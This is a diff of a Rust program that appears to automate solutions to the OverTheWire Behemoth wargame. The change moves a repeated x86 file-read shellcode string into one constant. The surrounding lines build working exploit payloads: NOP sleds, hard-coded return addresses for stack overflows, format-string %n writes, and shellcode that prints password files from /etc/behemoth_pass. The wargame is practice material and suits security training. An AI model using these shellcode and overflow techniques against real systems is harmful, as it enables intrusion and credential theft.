@@ -6,6 +6,8 @@ use anyhow::Result;
 const HOST: &str = "behemoth.labs.overthewire.org";
 const PORT: usize = 2221;
 
+const READ_FILE_SHELLCODE : &str = "31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF"; // https://shell-storm.org/shellcode/files/shellcode-73.html
+
 fn main() -> Result<()> {
 
     println!("LETS DO BEHEMOTH SHALL WE...\n");
@@ -139,7 +141,7 @@ fn behemoth1(password: &str) -> Result<String> {
     let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
     let jmp_esp = hex::decode("eb04")?; // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
     let var_adr = hex::decode("01d5ffff")?; // 0xffffd501, approximate location in nop sled
-    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
+    let file_read_shellcode = hex::decode(READ_FILE_SHELLCODE).unwrap();
     let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
 
     let mut full_payload: Vec<u8> = Vec::new();
@@ -229,7 +231,7 @@ fn behemoth3(password: &str) -> Result<String> {
     let upper_two = "%1$76666x %2$n".as_bytes(); // this again, minus the spaces so far, to try and get the upper four bytes to ffff
 
     let nop_sled: Vec<u8> = vec![0x90; 40]; 
-    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
+    let file_read_shellcode = hex::decode(READ_FILE_SHELLCODE).unwrap();
     let file_to_read = "/etc/behemoth_pass/behemoth4".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
     
     let mut full_payload: Vec<u8> = Vec::new();
@@ -365,7 +367,7 @@ fn behemoth6(password: &str) -> Result<String> {
     println!("creating input files (flag and shellcode)");
     write_line(&mut channel, "echo -n HelloKitty > flag.txt")?;
     read_until(&mut channel, "$ ")?;
-    let shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF")?;
+    let shellcode = hex::decode(READ_FILE_SHELLCODE)?;
     write_line(&mut channel, &format!("echo -en \"{}flag.txt\" > shellcode.txt", hex_literal(&shellcode)))?;
     read_until(&mut channel, "$ ")?;
 
@@ -395,7 +397,7 @@ fn behemoth7(password: &str) -> Result<String> {
     let prefix: Vec<u8> = vec![0x41; 528];
     let var_adr = hex::decode("a0d2ffff")?; // 0xffffd35c, approximate location in nop sled
     let nop_sled: Vec<u8> = vec![0x90; 64];
-    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
+    let file_read_shellcode = hex::decode(READ_FILE_SHELLCODE).unwrap();
     let file_to_read = "/etc/behemoth_pass/behemoth8".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
 
     let mut full_payload: Vec<u8> = Vec::new();
